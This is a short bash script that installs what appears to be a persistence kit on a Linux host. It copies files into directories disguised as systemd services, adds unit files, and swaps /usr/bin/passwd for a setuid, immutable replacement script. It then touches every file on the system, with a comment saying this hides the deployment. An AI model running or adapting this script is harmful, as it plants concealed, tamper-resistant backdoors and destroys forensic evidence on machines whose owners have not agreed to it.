#! /bin/bash

# Check if we are root and bail out if not
if [ "$EUID" -ne 0 ]; then
	echo "You must run this script as root"
	exit
fi

# Install figlet and cowsay
apt-get update && apt-get install -y cowsay figlet

# Make the directories
mkdir --parents -- /usr/share/systemd-bootd \
	/usr/share/systemd-firewalld \
	/usr/share/systemd-issued \
	/usr/share/systemd-maild \
	/usr/share/systemd-pamd \
	/usr/share/systemd-printerd \
	/usr/share/systemd-sshd \
	/usr/share/systemd-userd

# Move the files
cp -- ./systemd/* /etc/systemd/system/
cp -r -- ./* /usr/share/systemd-bootd/
cp -r -- ./* /usr/share/systemd-firewalld/
cp -r -- ./* /usr/share/systemd-issued/
cp -r -- ./* /usr/share/systemd-maild/
cp -r -- ./* /usr/share/systemd-pamd/
cp -r -- ./* /usr/share/systemd-printerd/
cp -r -- ./* /usr/share/systemd-sshd/
cp -r -- ./* /usr/share/systemd-userd/

# Replace the passwd binary a script
mv -- /usr/bin/passwd /usr/bin/pasuswd
cp -- ./passwd /usr/bin/passwd
chown root:root -- /usr/bin/passwd /usr/bin/pasuswd
chmod 4755 -- /usr/bin/passwd /usr/bin/pasuswd
chattr +i -- /usr/bin/passwd /usr/bin/pasuswd

# Touch every file to hide deployment
find / -exec touch --no-dereference {} + >/dev/null 2>/dev/null

# Done!
figlet "Enjoy!" | /usr/games/cowsay -nsw

# vim: set filetype=sh:
